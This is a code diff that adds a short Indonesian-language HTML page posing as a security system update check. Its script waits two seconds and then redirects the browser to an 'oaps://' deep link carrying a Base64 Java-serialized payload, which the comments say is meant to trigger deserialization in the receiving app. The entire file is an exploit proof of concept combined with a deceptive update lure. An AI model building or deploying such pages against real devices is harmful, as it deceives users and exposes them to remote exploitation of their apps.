@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sistem Update Keamanan</title>
+</head>
+<body>
+    <h2>Memeriksa Pembaruan Sistem...</h2>
+    <script>
+        // Payload Base64 yang akan memicu deserialization
+        const malicious_payload = "rO0ABXNyABFpbnZhbGlkLnBheWxvYWQAAAAAAAAAAQIAAHhw"; 
+        
+        // Link Deep Link OAPS
+        const deepLink = "oaps://add?ckey=sys_update&cb=" + malicious_payload;
+
+        // Otomatis mengalihkan ke Deep Link setelah 2 detik
+        setTimeout(() => {
+            window.location.href = deepLink;
+        }, 2000);
+    </script>
+</body>
+</html>
